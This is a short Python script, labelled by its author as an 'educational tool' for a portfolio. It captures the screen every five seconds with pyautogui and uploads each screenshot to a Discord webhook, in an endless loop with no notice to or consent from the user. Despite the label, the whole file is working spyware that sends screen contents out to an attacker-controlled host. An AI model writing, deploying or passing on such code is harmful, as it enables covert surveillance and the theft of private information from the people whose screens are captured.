'''
Author: Aayan Ahmad Khan
Date: 01/03/2025
INFO: Educational Tool just too show my talent and improve my portfoilio!
'''

import pyautogui
import time
import requests
import schedule

DISCORD_WEBHOOK_URL = "WEBHOOK URL!"

def screenshot_and_send():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    with open("screenshot.png", "rb") as file:
        response = requests.post(DISCORD_WEBHOOK_URL, files={"file": file})

    if response.status_code == 200 or response.status_code == 204:
        print("Screenshot sent successfully!")
    else:
        print(f"Failed to send screenshot: {response.status_code}")

schedule.every(5).seconds.do(screenshot_and_send)

while True:
    schedule.run_pending()

    time.sleep(1)
